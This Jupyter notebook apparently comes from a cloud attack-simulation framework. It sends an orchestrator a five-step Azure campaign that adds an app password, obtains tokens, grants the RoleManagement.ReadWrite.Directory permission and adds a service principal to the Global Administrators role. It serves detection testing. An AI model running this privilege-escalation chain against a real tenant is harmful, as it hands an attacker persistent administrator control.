---
jupyter:
  jupytext:
    text_representation:
      extension: .md
      format_name: markdown
      format_version: '1.3'
      jupytext_version: 1.14.7
  kernelspec:
    language: python
---

# Admin promotion via Directory Role Permission Grant


## Metadata



|                   |    |
|:------------------|:---|
| contributors      | ['Azure'] |
| platform          | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2021-11-01 |
| modification date | 2022-05-01 |
| Tactics           | [TA0003](https://attack.mitre.org/tactics/TA0003) |
| Techniques        | [T1098.001](https://attack.mitre.org/techniques/T1098/001) |


## Description
A campaign to simulate a threat actor granting the Microsoft Graph RoleManagement.ReadWrite.Directory (application) permission to an Azure service principal and using the new permissions to add an Azure AD object or user account to an Admin directory role (i.e. Global Administrators).


## Get OAuth Access Token

```python
from msal import PublicClientApplication
import requests
import time

function_app_url = "https://FUNCTION_APP_NAME.azurewebsites.net"

tenant_id = "TENANT_ID"
public_client_app_id = "KATANA_CLIENT_APP_ID"
server_app_id_uri = "api://" + tenant_id + "/cloudkatana"
scope = server_app_id_uri + "/user_impersonation"

app = PublicClientApplication(
    public_client_app_id,
    authority="https://login.microsoftonline.com/" + tenant_id
)
result = app.acquire_token_interactive(scopes=[scope])
bearer_token = result['access_token']
```

## Set Azure Function Orchestrator

```python
endpoint = function_app_url + "/api/orchestrators/Orchestrator"
```

## Load Campaign

```python
data = {"id": "attackscenario-7dde2208-d4eb-480e-afa1-bad0ab7e861b", "name": "Admin promotion via Directory Role Permission Grant", "metadata": {"creationDate": "2021-11-01", "modificationDate": "2022-05-01", "platform": ["Azure"], "description": "A campaign to simulate a threat actor granting the Microsoft Graph RoleManagement.ReadWrite.Directory (application) permission to an Azure service principal and using the new permissions to add an Azure AD object or user account to an Admin directory role (i.e. Global Administrators).", "contributors": ["Roberto Rodriguez @Cyb3rWard0g"], "mitreAttack": [{"technique": "T1098.001", "tactics": ["TA0003"]}]}, "steps": [{"number": 1, "name": "AddPasswordToAADApp", "execution": {"type": "ScriptModule", "platform": "Azure", "executor": "PowerShell", "module": {"name": "CloudKatanaAbilities", "version": "1.3.1", "function": "Add-CKAzADAppPassword"}, "parameters": {"appObjectId": {"type": "string", "defaultValue": "test"}}}, "wait": 120}, {"number": 2, "name": "GetAccessTokenOne", "dependsOn": [1], "execution": {"type": "ScriptModule", "platform": "Azure", "executor": "PowerShell", "module": {"name": "CloudKatanaAbilities", "version": "1.3.1", "function": "Get-CKAccessToken"}, "parameters": {"ClientId": {"type": "string", "defaultValue": "test"}, "GrantType": {"type": "string", "defaultValue": "client_credentials"}, "AppSecret": {"type": "string", "defaultValue": "reference(1).secretText"}}}}, {"number": 3, "name": "GrantRoleMgmtPermission", "dependsOn": [2], "execution": {"type": "ScriptModule", "platform": "Azure", "executor": "PowerShell", "module": {"name": "CloudKatanaAbilities", "version": "1.3.1", "function": "Grant-CKAzADAppPermissions"}, "parameters": {"accessToken": {"type": "string", "defaultValue": "reference(2).access_token"}, "spObjectId": {"type": "string", "defaultValue": "test"}, "resourceName": {"type": "string", "defaultValue": "Microsoft Graph"}, "permissionType": {"type": "string", "defaultValue": "Application"}, "permissions": {"type": "array", "defaultValue": ["RoleManagement.ReadWrite.Directory"]}}}, "wait": 120}, {"number": 4, "name": "GetAccessTokenTwo", "dependsOn": [3], "execution": {"type": "ScriptModule", "platform": "Azure", "executor": "PowerShell", "module": {"name": "CloudKatanaAbilities", "version": "1.3.1", "function": "Get-CKAccessToken"}, "parameters": {"ClientId": {"type": "string", "defaultValue": "test"}, "GrantType": {"type": "string", "defaultValue": "client_credentials"}, "AppSecret": {"type": "string", "defaultValue": "reference(1).secretText"}}}}, {"number": 5, "name": "AddServicePrincipalToGARole", "dependsOn": [4], "execution": {"type": "ScriptModule", "platform": "Azure", "executor": "PowerShell", "module": {"name": "CloudKatanaAbilities", "version": "1.3.1", "function": "Add-CKAzADDirectoryRoleMember"}, "parameters": {"accessToken": {"type": "string", "defaultValue": "reference(4).access_token"}, "directoryRoleTemplateId": {"type": "string", "defaultValue": "test"}, "directoryObjectId": {"type": "string", "defaultValue": "test"}}}}], "file_name": "attackscenario-7dde2208-d4eb-480e-afa1-bad0ab7e861b"}
```

### Send HTTP Request

```python
http_headers = {'Authorization': 'Bearer ' + bearer_token, 'Accept': 'application/json','Content-Type': 'application/json'}
results = requests.get(endpoint, json=data, headers=http_headers, stream=False).json()

time.sleep(30)
```

### Explore Output

```python
query_status = requests.get(results['statusQueryGetUri'], headers=http_headers, stream=False).json()
query_results = query_status['output']
query_results
```
